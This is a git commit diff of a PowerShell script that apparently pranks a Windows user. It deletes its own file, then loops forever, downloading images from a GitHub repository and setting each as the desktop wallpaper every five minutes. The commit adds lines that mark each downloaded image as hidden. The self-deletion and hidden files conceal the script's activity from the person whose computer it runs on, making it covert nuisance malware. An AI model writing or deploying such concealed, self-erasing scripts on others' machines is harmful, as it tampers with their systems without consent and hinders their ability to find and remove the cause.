e7c2f7a98e6243603cb97438050f255f50ce9e2b
Michel Krapf <michel.krapf@gmail.com>
2023-02-14 23:03:39 +0100

    hide image file in windows

--- script/scrpt.ps1
+++ script/scrpt.ps1
@@ -21,21 +21,27 @@ Remove-Item -Path $MyInvocation.MyCommand.Path
 # Continuously download a new wallpaper and set it as the desktop background every 5 minutes
 while ($true) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/babygorilla.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/confusedbaby.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/dicknose.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/grinning.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/scary.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mkrapf/AMWP/master/images/sitting.jpg" -OutFile $imgPath
+    Set-ItemProperty -Path $imgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     [Win32.Wallpaper]::SetWallpaper($imgPath)
     Start-Sleep -Seconds 300
 
